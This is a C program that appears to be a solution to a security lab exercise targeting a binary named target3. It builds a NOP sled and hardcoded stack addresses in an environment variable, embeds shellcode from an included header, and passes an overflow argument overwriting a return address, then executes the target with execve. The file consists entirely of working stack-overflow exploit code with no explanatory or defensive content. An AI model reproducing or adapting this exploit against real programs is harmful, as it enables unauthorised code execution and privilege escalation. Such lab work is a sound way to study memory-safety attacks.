#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"

const int BUFFER_SIZE = 400;
const int SHELLCODE_OFFSET = 201;
const uint32_t BASE_ADDRESS = 0xffffdec0;

void prepareEnvironment(char *environment) {
    memset(environment, 0x90, BUFFER_SIZE - 1);

    *((uint32_t *)(environment)) = BASE_ADDRESS + 4;
    *((uint32_t *)(environment + 4)) = BASE_ADDRESS + 8;

    memcpy(environment + SHELLCODE_OFFSET, shellcode, sizeof(shellcode));
}

int main(void)
{
    char *args[3];
    char *env[2];
    char environment[BUFFER_SIZE];

    prepareEnvironment(environment);

    //test
    args[0] = TARGET;
    args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
    args[2] = NULL;

    env[0] = environment;
    env[1] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}